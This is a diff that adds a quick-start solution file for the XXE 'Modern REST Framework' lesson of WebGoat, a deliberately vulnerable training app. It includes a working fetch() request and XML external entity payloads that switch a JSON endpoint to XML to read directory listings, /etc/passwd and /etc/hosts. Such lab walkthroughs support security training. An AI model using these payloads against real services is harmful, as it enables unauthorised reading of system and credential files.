@@ -1,0 +1,111 @@
+====================================================================
+XXE - MODERN REST FRAMEWORK - QUICK START
+====================================================================
+
+Challenge: Exploit XXE on a JSON API that unexpectedly accepts XML
+
+KEY TECHNIQUE: Change Content-Type from JSON to XML!
+
+====================================================================
+FASTEST SOLUTION - Browser Console:
+====================================================================
+
+1. Open WebGoat → XXE → Modern REST Framework lesson
+
+2. Submit a normal comment to find the endpoint (check Network tab)
+
+3. Open Console (F12)
+
+4. Run this command (adjust endpoint if needed):
+
+fetch("http://192.168.254.112:8001/WebGoat/xxe/content-type", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/xml"
+  },
+  body: '<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>'
+}).then(r => r.text()).then(console.log);
+
+5. Check response for directory listing!
+
+====================================================================
+WHY THIS WORKS:
+====================================================================
+
+Normal Request (JSON):
+POST /WebGoat/xxe/content-type
+Content-Type: application/json
+{"comment": "Hello"}
+
+Exploited Request (XML):
+POST /WebGoat/xxe/content-type
+Content-Type: application/xml          <-- Changed!
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
+
+Modern frameworks (Spring Boot, JAX-RS) auto-parse based on Content-Type!
+Even if endpoint expects JSON, it will parse XML if you tell it to!
+
+====================================================================
+POSSIBLE ENDPOINTS TO TRY:
+====================================================================
+
+- /WebGoat/xxe/content-type (most likely)
+- /WebGoat/xxe/comments
+- /WebGoat/xxe/rest
+- /WebGoat/xxe/modern
+
+Check Network tab after submitting a comment to find the real one!
+
+====================================================================
+OTHER PAYLOADS:
+====================================================================
+
+Read /etc/passwd:
+body: '<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>'
+
+Read /etc/hosts:
+body: '<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><comment><text>&xxe;</text></comment>'
+
+====================================================================
+TOOLS AVAILABLE:
+====================================================================
+
+xxe_rest_tool.html           - Interactive HTML tool
+xxe_rest_framework_guide.txt - Complete guide
+xxe_rest_quickstart.txt      - This file
+
+====================================================================
+DIFFERENCE FROM FIRST XXE CHALLENGE:
+====================================================================
+
+Challenge 1 (Simple):
+- Endpoint: /WebGoat/xxe/simple
+- Already expects XML
+- Just inject XXE payload
+
+Challenge 2 (Modern REST):
+- Endpoint: /WebGoat/xxe/content-type
+- Expects JSON normally
+- **Must change Content-Type header to application/xml**
+- This tricks the framework into parsing XML
+
+====================================================================
+TROUBLESHOOTING:
+====================================================================
+
+❌ 415 Unsupported Media Type
+→ Check Content-Type is exactly "application/xml"
+
+❌ 400 Bad Request
+→ Check XML syntax is valid
+
+❌ No output
+→ Try different file paths
+
+❌ Works but lesson not complete
+→ Check if specific file is required
+
+====================================================================
+SUCCESS = Directory listing or file contents in response!
+====================================================================
